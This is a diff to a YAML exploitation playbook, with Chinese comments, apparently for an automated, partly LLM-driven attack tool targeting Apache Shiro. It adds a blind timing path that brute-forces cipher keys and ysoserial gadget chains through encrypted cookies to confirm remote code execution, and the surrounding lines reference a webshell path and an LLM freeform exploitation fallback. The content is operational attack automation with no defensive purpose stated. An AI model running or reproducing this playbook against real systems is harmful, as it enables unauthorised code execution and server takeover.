@@ -142,6 +142,31 @@ exploit_paths:
         evidence_capture:
           shell_type: "rce_shiro_webshell"
 
+  # ═══ 路径 B: 时序盲检测（无回连、无 webroot 依赖）═══
+  - path_id: shiro_blind
+    name: "shiro_exploit.py 时序盲检测"
+    priority: 5
+    principle: |
+      用 sleep 命令验证 RCE，不依赖回连或 webroot:
+      1. 先收集目标基线响应时间（正常请求的 RTT）
+      2. 用 JDK 8 + ysoserial 生成各 gadget 的 sleep N payload
+      3. 遍历 密钥×gadget 组合，发送加密 Cookie，测量响应时间
+      4. 响应时间显著超过基线 → RCE 确认
+    conditions:
+      shiro_confirmed: true
+    steps:
+      - id: shiro_blind
+        description: "时序盲检测爆破（sleep 验证）"
+        command: |
+          python3 /opt/shiro_exploit.py {ENDPOINT} --blind
+        timeout: 600
+        success_criteria:
+          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_shiro_blind"
+
   # ═══ 路径 C: LLM 兜底 ═══
   - path_id: llm_freeform
     name: "LLM 自由推理（限定 Shiro 漏洞范围）"
